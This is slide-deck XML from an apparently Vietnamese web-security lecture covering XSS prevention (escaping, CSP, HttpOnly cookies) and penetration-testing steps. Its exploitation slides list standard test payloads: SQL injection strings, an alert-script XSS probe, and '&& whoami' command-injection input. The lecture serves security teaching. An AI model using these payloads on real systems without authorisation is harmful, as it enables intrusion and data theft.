                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn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ngừa</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XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Escape Output (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thoát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ký</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tự</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đầu</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ra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Dùng</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hàm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> escape </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>phù</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hợp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theo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cảnh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>HTML context: &amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>; , </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>; , </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>&amp;amp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>; .</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>JavaScript context: escape </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>dấu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nháy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 , ‘ .</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>URL context: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>encodeURIComponent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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27059328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3" y="546389"/>
            <a:ext cx="10242645" cy="474259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.6.</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ngừa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SQLi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57953" y="1020648"/>
            <a:ext cx="9573904" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn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ngừa</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XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2</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Input </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Validation &amp; Sanitization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Chỉ cho phép dữ liệu hợp lệ (whitelist) thay vì loại trừ (blacklist).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Loại bỏ thẻ &lt;script&gt;, sự kiện onClick, onError… khi người dùng nhập dữ liệu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b3</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Content </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Security Policy (CSP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thêm header HTTP:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Content-Security-Policy: default-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> 'self'; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>script-src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> 'self';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hạn chế chỉ cho phép script từ domain tin cậy, chặn thực thi script inline.</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8141249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3" y="546389"/>
            <a:ext cx="10242645" cy="474259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.6.</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ngừa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SQLi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57952" y="1020648"/>
            <a:ext cx="10242645" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn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ngừa</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XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. HttpOnly &amp; Secure Cookie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Đặt cookie session là HttpOnly để JavaScript không thể đọc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Dùng Secure và SameSite để giảm nguy cơ bị đánh cắp cookie qua XSS + CSRF.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b5. Framework hỗ trợ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Các framework hiện đại (Angular, React, Django, Spring Security) có sẵn cơ chế chống XSS nếu tuân thủ đúng coding convention.</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6948071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461010"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Lập kế hoạch và phạm vi kiểm tra</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Xác định mục tiêu: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tra toàn bộ ứng dụng hay chỉ một module (đăng nhập, thanh toán…).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phạm vi: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ên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>miền, API endpoint, môi trường test hay production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thỏa thuận với chủ sở hữu hệ thống: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ránh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>gây gián đoạn dịch vụ thật.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Chọn phương pháp kiểm tra:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Black-box: </a:t>
            </a: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iả </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>lập hacker bên ngoài, không có thông tin hệ thống.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>White-box: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thử có toàn bộ mã nguồn, cấu hình.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="682625" lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Gray-box: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ết </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hợp cả </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hai, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>vừa có thông tin, vừa giả lập tấn công thực tế.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </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5728490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461010"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Quét lỗ hổng tự động (Automated Scanning)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công cụ:</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OWASP ZAP, Burp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Suite</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P</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hát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hiện SQLi, XSS, CSRF.</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Nikto,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Nmap</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iểm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tra cấu hình web server, cổng mở, TLS.</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Ưu điểm: nhanh, bao phủ rộng, phát hiện được lỗ hổng phổ biến.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Nhược điểm: có thể bỏ sót lỗ hổng logic hoặc báo false positive.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </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1566199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461010"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Xác minh lại kết quả quét tự động để loại bỏ false positive.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nghiệm khai thác (Exploitation):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iểm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tra liệu lỗ hổng có thể bị lợi dụng thực sự.</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nhập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 OR '1'='1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để kiểm tra SQLi.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chèn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&lt;script&gt;alert(1)&lt;/script&gt;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để test XSS.</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logic nghiệp vụ (business logic flaws):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>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bỏ qua bước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thanh toán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nhưng vẫn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nhận được đơn hàng</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thay đổi role từ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user</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thành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admin</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trên request.</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tích session, cookie, header HTTP để tìm điểm yếu bảo mật.</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9772481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32"/>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1"/>
            <a:ext cx="9996986"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pPr marL="0" indent="0">
              <a:buNone/>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minh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quét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tự</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động</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do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báo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loại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bỏ</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false positive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sai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request/response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(qua Burp Suite, Postman,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cURL</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minh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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4330542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32"/>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1"/>
            <a:ext cx="10242645"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nghiệm khai thác (Exploitation Testing)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Injection Attacks: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SQL Injection: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payload ' OR '1'='1 hoặc UNION SELECT NULL-- để kiểm tra truy vấn SQL.</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Command Injection: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hèn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ls -la hoặc &amp;&amp; whoami vào trường nhập liệu</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342900"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CSRF (Cross-Site Request Forgery): tạo form giả để ép trình duyệt gửi request thay người dùng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a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10987500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32"/>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1"/>
            <a:ext cx="10351828"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nghiệm khai thác (Exploitation Testing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XSS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(Cross-Site Scripting):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Reflected XSS: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hập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&lt;script&gt;alert(1)&lt;/script&gt; </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
